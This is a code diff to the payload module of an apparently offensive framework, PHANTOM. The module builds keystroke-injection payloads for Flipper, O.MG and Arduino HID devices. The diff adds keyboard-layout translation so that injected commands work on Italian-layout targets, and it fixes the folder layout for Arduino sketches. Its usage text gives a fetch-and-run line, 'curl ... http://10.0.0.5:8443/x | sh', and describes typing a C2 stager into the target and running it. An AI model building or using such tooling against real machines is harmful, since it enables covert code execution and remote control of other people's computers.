@@ -243,6 +243,11 @@ class PayloadModule(BaseModule):
           --target <os>   the OS the board will type into (windows|linux|
                           macos|android): the command must match it, and
                           nothing can detect it at runtime (9.2)
+          --layout <l>    the keyboard layout the TARGET has active
+                          (us|it, default us). The board sends US scan
+                          codes, so on an Italian target / ( = {} @ # come
+                          out wrong unless the command is pre-translated
+                          for that layout.
           --stager <os>   build the PHANTOM stager for that OS with the
                           current C2 endpoint and type THAT (instead of
                           pasting a command by hand). The stager is
@@ -263,16 +268,18 @@ class PayloadModule(BaseModule):
           payload hid flipper "curl -sk http://10.0.0.5:8443/x | sh" \
               --target linux
           payload hid omg --stager linux --target linux
-          payload hid arduino --stager windows --target windows --run
+          payload hid arduino --stager windows --target windows --run \
+              --layout it
         """
         from phantom.utils.hid_builder import (
-            BOARDS, board_notes, build_hid_payload)
+            ARDUINO_BOARDS, BOARDS, board_notes, build_hid_payload)
 
         parts = arg.strip().split()
         board = ""
         command = ""
         target = ""
         stager = ""
+        layout = "us"
         out = ""
         delay_ms = 1500
         press_enter = True
@@ -287,6 +294,10 @@ class PayloadModule(BaseModule):
                 continue
             if tok == "--stager" and i + 1 < len(parts):
                 stager = parts[i + 1].lower()
+                i += 2
+                continue
+            if tok == "--layout" and i + 1 < len(parts):
+                layout = parts[i + 1].lower()
                 i += 2
                 continue
             if tok == "--out" and i + 1 < len(parts):
@@ -341,6 +352,7 @@ class PayloadModule(BaseModule):
             return
         try:
             payload = build_hid_payload(board, command, target=target,
+                                        layout=layout,
                                         delay_ms=delay_ms,
                                         press_enter=press_enter,
                                         open_run=open_run)
@@ -351,8 +363,13 @@ class PayloadModule(BaseModule):
         import os
         if not out:
             from phantom.utils.paths import data_dir
-            out = os.path.join(data_dir(), "vectors",
-                               f"{board}_{payload.filename}")
+            name = f"{board}_{payload.filename}"
+            if board in ARDUINO_BOARDS:
+                # the Arduino IDE refuses a sketch whose folder is not named
+                # after the .ino file: put it in a folder of the same name
+                stem = os.path.splitext(name)[0]
+                name = os.path.join(stem, f"{stem}.ino")
+            out = os.path.join(data_dir(), "vectors", name)
         os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
         with open(out, "w", encoding="utf-8", newline="\n") as handle:
             handle.write(payload.content)
